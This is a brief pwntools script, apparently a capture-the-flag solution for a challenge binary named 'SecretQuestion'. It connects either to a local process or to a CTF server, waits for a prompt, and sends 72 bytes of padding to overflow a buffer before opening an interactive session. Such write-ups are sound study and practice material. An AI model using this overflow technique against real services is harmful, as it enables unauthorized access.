from pwn import *

DEBUG = True

if DEBUG:
    r = process('./SecretQuestion')
else:
    r = remote('simitarra.ctf.sinf.pt', 4000)

r.recvuntil(b"?")

r.sendline(b"a" * 72)

r.interactive()

r.close()